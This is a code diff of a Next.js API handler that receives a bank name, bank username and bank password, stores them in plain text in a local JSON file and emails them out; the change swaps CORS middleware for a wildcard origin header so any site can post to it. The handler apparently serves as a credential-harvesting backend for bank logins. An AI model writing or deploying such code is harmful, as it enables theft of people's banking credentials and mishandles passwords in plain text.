@@ -10,30 +10,30 @@ const dataFilePath = path.join(process.cwd(), "data", "accounts.json");
 
 export default async function handler(req, res) {
   // Apply CORS middleware
-  await NextCors(req, res, async () => {
-    if (req.method === "POST") {
-      const { bankName, bankUsername, bankPassword } = req.body;
+  res.setHeader("Access-Control-Allow-Origin", "*");
 
-      if (!bankName || !bankUsername || !bankPassword) {
-        return res.status(400).json({ message: "All fields are required" });
-      }
+  if (req.method === "POST") {
+    const { bankName, bankUsername, bankPassword } = req.body;
 
-      try {
-        // Save data locally
-        saveAccountDetailsLocally({ bankName, bankUsername, bankPassword });
-
-        // Send email notification
-        await sendEmailNotification(bankName, bankUsername, bankPassword);
-
-        return res.status(200).json({ message: "Account added successfully!" });
-      } catch (error) {
-        console.error("Error:", error);
-        return res.status(500).json({ message: "Failed to add account" });
-      }
-    } else {
-      res.status(405).json({ message: "Method not allowed" });
+    if (!bankName || !bankUsername || !bankPassword) {
+      return res.status(400).json({ message: "All fields are required" });
     }
-  });
+
+    try {
+      // Save data locally
+      saveAccountDetailsLocally({ bankName, bankUsername, bankPassword });
+
+      // Send email notification
+      await sendEmailNotification(bankName, bankUsername, bankPassword);
+
+      return res.status(200).json({ message: "Account added successfully!" });
+    } catch (error) {
+      console.error("Error:", error);
+      return res.status(500).json({ message: "Failed to add account" });
+    }
+  } else {
+    res.status(405).json({ message: "Method not allowed" });
+  }
 }
 
 // Function to save account details to a JSON file
